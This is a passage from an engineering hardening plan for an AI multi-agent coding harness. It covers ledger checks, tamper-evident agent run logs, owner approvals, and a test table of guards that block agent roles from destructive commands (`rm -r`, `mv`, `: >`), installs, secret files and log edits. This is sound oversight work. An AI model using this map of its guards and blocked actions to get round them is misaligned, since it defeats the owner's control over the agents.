**H-50.** Before Wave 1 ends and before any broader implementation, the owner attests in writing that no production credential is reachable from this machine or from any attached connector.

## 6. Ledger, run log and tracking

**Design tier (H-13), proposed change to `scripts/check-feature-ledger.mjs:20-23`:**

```diff
 const REQUIRED = {
   substantial: ['architect', 'sage-before', 'plan-approved', 'implementation', 'sage-during', 'qa', 'review', 'sage-after'],
   small: ['implementation', 'qa', 'review', 'sage-after'],
+  design: ['sage-before', 'plan-approved', 'authoring', 'review', 'sage-after'],
 };
```

- `authoring` is a new stage name, so nobody ticks a stage claiming code was built. `security-sensitive: yes` adds `security`, as today (`:85`).
- `SKILL.md:14` and `:18` say anything security-sensitive is `substantial`. The skill gains an exception in words: documentation-only work that changes nothing outside `docs/` may use `design` with the security stage; anything that changes code, configuration or infrastructure is `substantial`.
- `tier: trivial` with `accepted: yes` or `learning-complete: yes` becomes an error (`:64`).
- **H-38:** when a `design` ledger is accepted, every path changed since the ledger's baseline must lie under `docs/`. The baseline is not typed by anyone: the checker takes the parent of the commit that first added the ledger file.
- The tier has no separate architect stage; the Software Architect is named among the `authoring` agents and must have its own evidence.
- Introduced in step 6a with H-37 and H-19. The seven existing ledger cases are predicted to pass unchanged in that step; `scripts/test-guards.mjs:134` changes only in step 6b.

**Evidence for a stage, two kinds.**

1. A delegated run: the run-log record, cited by `agentId`.
2. An owner-launched direct session: the raw output the owner saves under `docs/testing/evidence/`, whose first record is the harness's start-up record. It is cited by path and session id. Which fields of that record identify the agent is to be confirmed by the owner's first capture. A file an agent could have written is weak evidence; it becomes strong when the owner commits it.

Nobody runs a trivial delegation to manufacture a run record.

**Run log.** `.claude/logs/agent-runs.jsonl` and every record in it are preserved. Nobody deletes, truncates or edits it. On 2026-10-12 it held 18 lines; the first nine are the probe records of 06:41 UTC on 2026-10-11. Their hash and the file's hash are recorded in the readiness report so later checks can confirm the earlier lines are an unchanged prefix. The harness appends as specialists finish; that is the log working.

**Tracking the SRE phase.** Until step 6a is applied, the phase has a hand ledger at `docs/status/sre-architecture-phase.md`, in the `design` stage format, labelled "tracked by hand; not machine-checked". **That file does not exist yet**; the Chief Engineer creates it when the owner opens the phase. While tracking is by hand, a `started` date has no mechanical effect; the phase is told apart from the probe records by citing specific run ids and session files. Nobody cites the checker's "0 ledger(s) checked" as evidence for the phase. When the tier exists, the file is **copied** into `docs/status/features/` by the owner, adjusted to the then-current stage format, and checked.

## 7. Regression test set

Proposed cases, by area. None has been run. QA's plan `docs/testing/hardening-test-plan-2026-10-11.md` predates this revision and must be brought into line with it before step 1.

| Area | Cases that must hold after every step | Cases that must change |
|---|---|---|
| Path ownership | The 26 existing ownership cases, except line 65 if H-32(a) is chosen | Protected prefixes, nested instruction files, links, unknown agent type |
| Destructive commands | Reviewer cannot `rm`, chain or redirect (existing) | `rm -r`, `mv`, `: >` for the four building roles |
| Dependency installation | `security-engineer` cannot `pnpm install` (existing, line 81) | Installs for all roles; `audit fix`; manifest, config and lockfile writes |
| Secrets | The 11 existing cases | Case variants, globs, braces, escapes, `@` and `:` forms, new formats; `.env.EXAMPLE` pinned as blocked |
| Fail-safe behaviour | — | Malformed input; unset project directory; message asserted on every BLOCK |
| Run-log integrity | Named agent cannot Write the log (pin) | Shell append; redirected `--log` |
| Missing logs | In-progress ledger with no ticked stage still passes | Ticked stage with no log fails; missing ledger folder fails |
| Ledger checks | The seven existing cases in step 6a | Design tier; stage-to-agent table; field strictness; run-id binding (line 134 changes in 6b) |

## 8. Git history

- **Foundation baseline:** one commit by the owner on `main`, described in `docs/status/baseline-commit-readiness-2026-10-12.md`.
- **Hardening:** a separate branch, one commit per Wave 1 step, each with its saved test output.
- **SRE phase documents:** their own branch, not mixed with hardening.

## 9. Answers to the first independent review of Proposal B

| Reviewer item | State in revision 3 |
|---|---|
| B1: no entry for R14, R15, R18, R19 | H-39, H-40, H-41 |
| B1: FAILED 14; FAILED 2 | H-42; H-43 |
| B1: UNVERIFIED 2, 5, 14, 15, 16, 19, 9 | H-43, H-44, H-45, H-46, H-41, H-41, H-40 |
| B1: entries missing fields; no implementer | Implementer and reviewers per finding in the table; fields completed for H-13, H-22, H-23, H-26 to H-29, H-36 to H-38 |
| B1: N-09, N-10, N-16, N-18, N-19, credential checklist | H-37; H-37; H-04; section 3; H-33 and H-49; H-50 |
| B2.1: no-shell observation unevidenced | Labelled relayed; owner capture required (H-42, Proposal A precondition) |
| B2.2 to B2.4: three unsourced statements | Sources stated and marked not on file (H-02, H-08); the email search is recorded with its command in the readiness report |
| B2.5: review stated before it happened | Header rewritten; file-presence rule stated |
| B2.6: H-06 "after, all pass" | Stripping replaced by glob matching |
| B3.1 to B3.10 | H-35; H-33; H-37; H-04; H-01 residual kept as an owner decision; H-06; H-16; H-14; H-02; H-38 |
| B4: no implementer; approve/apply order; no diff; reviewer cannot run tests | Section 3 |
| B4: H-12, H-21, "move unchanged" | QA drafts under `docs/testing/`, owner applies; owner-launched; "copied by the owner, adjusted" |
| B5: Wave 0 "can run now" | Each probe needs the owner's go-ahead |
| B7: nine wave inconsistencies | Section 4: H-05 in step 5; H-38 with H-13 in 6a; tier before binding (6a then 6b); 6a may go first; H-20 wording in 1.7; H-30 and H-17 shown with both parts; R15 is H-40 in Wave 0; H-12 step 1 then H-08 step 2; H-25 rewritten |
| B8: design tier and direct sessions; skill conflict; baseline; H-37 with it; trivial plus learning-complete | Section 6 |
| B8: date rule; no edit detection; file does not exist; "move" | Section 6; H-10 |
| Recommendation high 5: commands run by the orchestrating session | Section 1; readiness report |
| Low 16: section 1 contradiction; H-25 stale lines; H-24 reviewer | Section 2 table; H-25 rewritten; table row |

Not adopted: none. Left to the owner: H-01 residual risk, H-32, H-16 `Dockerfile` scope, H-09 whether direct records count, H-25 option, H-26, H-29.

## 10. Decisions for the owner

1. Approve, change or reject this plan as a plan. Approval of the plan approves no patch.
2. Go-ahead for Wave 0 probes, which the owner launches.
3. H-32: fence sessions with no agent type, or accept the risk in writing.
4. H-01: accept or reject the residual risk for building roles.
5. Whether step 6a goes ahead of steps 2 to 5 so the `design` tier exists before the SRE phase is accepted.
6. Who writes patch text (section 3, step 1).
7. H-10: stop ignoring the run log so git records it.
8. H-24: the model pin. H-29: which connectors stay attached.
9. H-16: may `devops-sre` write `apps/*/Dockerfile`. H-25: option (a) or (b). H-26: screenshot route.
